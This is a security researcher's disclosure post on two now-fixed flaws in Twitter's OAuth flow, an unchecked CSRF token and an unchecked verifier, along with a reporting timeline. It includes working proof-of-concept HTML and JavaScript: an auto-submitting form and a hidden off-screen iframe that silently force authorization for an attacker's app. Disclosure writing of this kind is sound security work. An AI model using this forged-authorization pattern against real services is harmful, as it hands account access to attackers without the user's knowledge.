# Twitter OAuth Vulnerability

A while ago I found quite a serious vulnerability in Twitter's implementation of [OAuth](http://en.wikipedia.org/wiki/OAuth).

The vulnerability I discovered is so severe that simply visiting a malicious webpage could give an attacker complete read, write and direct message access to your Twitter account.

Before I go into details of the vulnerability, let me make it clear that this vulnerability has been reported to Twitter and has been confirmed fixed.

## A quick OAuth primer

If you've ever used a Facebook or Twitter app before, you've come into contact with OAuth.

OAuth is a popular authorization protocol commonly used by service providers to allow users to connect with 'apps' and allow these apps to interact with the user's account.

Requesting access to a user's account via OAuth is quite simple:

Firstly, your application (the *consumer*) sends an authenticated request to the service provider to obtain a request token. Your application then redirects the user to the endpoint nominated by the service provider with this request token as a URL parameter.

If the user has never authorized your application before, the service provider will display a page asking the user if they wish to authorize your app to access their account. If the user chooses to allow your app access, they are redirected back to a URL your application nominates with a verifier token parameter.

Your application then presents this verifier token, the original request token, and a secret to the service provider and retrieves an access token. This access token allows your application to perform authenticated actions against the user's account.

## The first vulnerability in Twitter's OAuth implementation

Twitter's confirmation form presented to users when an app requests access to their account looks something like this:

    \html
    <form action="https://twitter.com/oauth/authorize" id="oauth_form" method="post">
      <div style="margin:0;padding:0">
        <input name="authenticity_token" type="hidden" value="[CSRF TOKEN]" />
      </div>
      
      <input id="oauth_token" name="oauth_token" type="hidden" value="[ORIGINAL REQUEST TOKEN]" />        
      <fieldset class="buttons">
        <legend>Authorize [APP NAME] access to use your account?</legend>
        <input type="submit" value="Authorize app" class="submit button selected" id="allow">
        <input class="submit button" id="cancel" name="cancel" type="submit" value="Cancel" />
      </fieldset>
    </form>

You'll notice that this form only sends two pieces of information to Twitter when the user clicks 'Allow':

* `oauth_token` — This happens to be the original token Twitter provided us with when we requested to authorize the user. This is **known information**.

* `authenticity_token` — This is a token intended to prevent CSRF attacks. The purpose of this token is to thwart attempts to forge an authenticated form submission from another website. The security of this form relies on this token being **unknown** to our app.

Unfortunately, there is no easy way to guess what `authenticity_token` Twitter serves to the user in this form.

Fortunately, **Twitter never bothers to check this token**.

Since we know every bit of information this form submits, we can create our own auto-submitting form that POSTs to Twitter's OAuth authorize endpoint to force the user to allow our malicious application access to their account.

Here's what such a form looks like:

    \html
    <form name="twitter" action="https://api.twitter.com/oauth/authorize" method="post">
      <input type="hidden" name="oauth_token" value="[ORIGINAL REQUEST TOKEN]" />
    </form>

    <script>
      document.forms.twitter.submit();
    </script>

When this form is submitted, the user will be sent to Twitter's "*redirecting back to the application*" page, which then redirects back to us and supplies the `oauth_verifier` we need to request an access token for the user.

This vulnerability is already bad enough, but the quick flash of Twitter's redirecting splash page may alert the user that something fishy is going on. We need to do better than this.

## The second vulnerability in Twitter's OAuth implementation

Once the user has authorized our app (whether willingly or not...), Twitter redirects them back to our app with a special `oauth_verifier` token in the URL. In theory, we'd need to use this verifier token to obtain the access_token from Twitter.

Luckily for us, **Twitter never bothers to check that we've supplied a verifier token!**

This means we can forge a POST request to Twitter's authorize endpoint into a hidden iframe, wait a second or two, then send a 'ping' back to our server letting it know it can try to retrieve the `access_token` from Twitter:

    \html
    <form name="twitter" action="https://api.twitter.com/oauth/authorize" method="post" target="target">
      <input type="hidden" name="oauth_token" value="[ORIGINAL REQUEST TOKEN]" />
    </form>

    <form name="ping" action="/confirm" target="target"></form>

    <iframe name="target" style="position:absolute;left:-999px;top:-999px;"></iframe>

    <script>
      document.forms.twitter.submit();

      setTimeout(function() {
        document.forms.ping.submit();
      }, 2000);
    </script>

Once the second "*ping*" form has submitted back to our server, we can retrieve an access token for the user and start making authenticated API requests on their behalf, even once they've closed our page!

What makes this vulnerability so dangerous is that by POSTing into a hidden iframe, all this activity is invisible to the user. They have absolutely no idea that they have been compromised.

## Twitter's response

Here's a timeline of the vulnerability discovery and reporting process:

* **March 31st** — Vulnerability discovered.

* **April 3rd** — Vulnerability reported to Twitter with [full proof of concept exploit](https://gist.github.com/haileysome/8241429802f57f063177).

* **April 3rd** — Twitter acknowledges receipt of the vulnerability.

* **April 5th** — Twitter claims to have fixed the vulnerability.

* **April 6th** — I inform Twitter that their OAuth implementation is still vulnerable to CSRF.

* **April 7th** — Twitter acknowledges they are vulnerable to CSRF, claims this is not a problem and that they are secure regardless.

* **April 7th** — [Slightly modified proof of concept exploit](https://gist.github.com/haileysome/c34935d45fd7355cf42d) provided to Twitter.

* **April 8th** — Twitter claims that "this time it really should be fixed!"

* **April 8th** — I confirm Twitter is no longer vulnerable.

* **April 8th** — Twitter asks if I would like to be added to their whitehat list.

* **April 8th** — I let Twitter know I wish to be added to their whitehat list.

* **April 8th** — Twitter tells me I'll be added to their whitehat list on the next update. Twitter tells me to be patient because they don't update it very frequently.

* **April 22nd** — Twitter **still** hasn't added me to their whitehat list, despite requests for updates on the situation.

It's important to remember that security researchers are in *no way* obligated to disclose vulnerabilities to your organisation. Each vulnerability reported is a gift. Treat whitehats poorly, and you may find they are reluctant to extend gestures of goodwill in the future.

Needless to say, I'll think twice before reporting another vulnerability to Twitter.

(also yes, I am aware of the irony of the footer section below this sentence)
